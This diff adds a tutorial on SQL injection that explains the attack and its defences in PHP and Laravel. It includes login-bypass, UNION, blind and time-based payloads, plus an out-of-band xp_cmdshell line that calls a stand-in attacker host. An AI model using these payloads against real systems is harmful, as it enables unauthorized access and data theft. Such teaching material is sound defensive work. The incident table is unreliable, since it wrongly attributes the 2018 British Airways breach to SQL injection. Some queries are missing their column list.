@@ -1,0 +1,123 @@
+_______________________________________________________________________________________________________________________________
+                                              SQL Injection (SQLi)
+
+ 1. What is SQL Injection?  
+SQL Injection (SQLi) is a web security vulnerability that allows an attacker 
+ to manipulate a database query by injecting malicious SQL code into input fields. 
+ 
+This can lead to:  
+✅ Unauthorized access to sensitive data (user credentials, financial data).  
+✅ Modification or deletion of database records.  
+✅ Complete system compromise (in some cases).  
+
+----------------------------------------------------------------------------------------
+
+ 2. How SQL Injection Works  
+
+An attacker injects malicious SQL code into an input field that is used in a database query. 
+If the input is not properly sanitized, the database executes the injected SQL command.  
+
+ 📌 Example of a Vulnerable Query  
+`````````````````````````````````````````````````````````````````php
+// ❌ Vulnerable SQL Query (User-provided input is directly used)
+$username = $_GET['username'];
+$password = $_GET['password'];
+
+$query = "SELECT  FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);
+`````````````````````````````````````````````````````````````````
+ 🔴 Attack Scenario: Bypassing Login
+- If an attacker enters:  
+  `````````````````````````````````````````````````````````````````
+  ' OR '1'='1
+  `````````````````````````````````````````````````````````````````
+- The final query becomes:  
+  `````````````````````````````````````````````````````````````````sql
+  SELECT  FROM users WHERE username = '' OR '1'='1' AND password = '';
+  `````````````````````````````````````````````````````````````````
+- Since '1'='1' is always true, the attacker logs in without valid credentials.
+
+----------------------------------------------------------------------------------------
+
+ 3. Types of SQL Injection  
+ 1️⃣ Classic SQL Injection
+- Injecting SQL commands into input fields to modify queries.  
+- Example:  
+  `````````````````````````````````````````````````````````````````
+  ' UNION SELECT username, password FROM users --
+  `````````````````````````````````````````````````````````````````
+  
+ 2️⃣ Blind SQL Injection
+- The attacker cannot see query results but infers information based on 
+   responses (e.g., true/false conditions, time delays).  
+- Boolean-based SQLi:  
+  `````````````````````````````````````````````````````````````````sql
+  ' AND 1=1 --  (Returns True ✅)
+  ' AND 1=2 --  (Returns False ❌)
+  `````````````````````````````````````````````````````````````````
+- Time-based SQLi:  
+  `````````````````````````````````````````````````````````````````sql
+  ' OR IF(1=1, SLEEP(5), 0) --
+  `````````````````````````````````````````````````````````````````
+  - If the server delays response by 5 seconds, the query was executed.
+
+ 3️⃣ Out-of-Band SQL Injection
+- Uses external communication (DNS, HTTP requests) to extract data when other methods fail.  
+- Example:  
+  `````````````````````````````````````````````````````````````````sql
+  '; EXEC xp_cmdshell('nslookup attacker.com') --
+  `````````````````````````````````````````````````````````````````
+
+----------------------------------------------------------------------------------------
+
+ 4. Real-World SQL Injection Attacks
+| Year |      Incident              | Impact                            |
+| 2019 | Fortnite SQLi              | Player data breached.             |
+| 2018 | British Airways SQLi       | 380,000 customer details stolen.  |
+| 2008 | Heartland Payment Systems  | 134 million credit cards exposed. |
+
+----------------------------------------------------------------------------------------
+
+ 5. How to Prevent SQL Injection  
+ 🛡️ 1. Use Prepared Statements (Parameterized Queries)
+✅ Always use prepared statements instead of concatenating user input.  
+`````````````````````````````````````````````````````````````````php
+// ✅ Secure Query using PDO
+$stmt = $pdo->prepare("SELECT  FROM users WHERE username = :username AND password = :password");
+$stmt->execute(['username' => $username, 'password' => $password]);
+$result = $stmt->fetch();
+`````````````````````````````````````````````````````````````````
+> Why? Prepared statements ensure that user input is treated as data, not code.
+
+----------------------------------------------------------------------------------------
+
+ 🛡️ 2. Use ORM (Eloquent in Laravel)
+✅ Laravel Eloquent ORM automatically protects against SQLi.  
+`````````````````````````````````````````````````````````````````php
+User::where('username', $username)->where('password', $password)->first();
+`````````````````````````````````````````````````````````````````
+
+----------------------------------------------------------------------------------------
+
+ 🛡️ 3. Validate & Sanitize User Input
+✅ Use Laravel’s request validation to enforce input rules.  
+`````````````````````````````````````````````````````````````````php
+$request->validate([
+    'username' => 'required|alpha_num',
+    'password' => 'required|min:8'
+]);
+`````````````````````````````````````````````````````````````````
+> Why? It ensures that only valid data is processed.
+
+----------------------------------------------------------------------------------------
+
+ 🛡️ 4. Use Web Application Firewalls (WAF)
+✅ Cloudflare, AWS WAF, ModSecurity can block SQLi attempts.  
+
+----------------------------------------------------------------------------------------
+
+ 🛡️ 5. Limit Database Privileges
+✅ Restrict database user privileges (e.g., avoid `GRANT ALL PRIVILEGES`).  
+
+----------------------------------------------------------------------------------------
+_______________________________________________________________________________________________________________________________
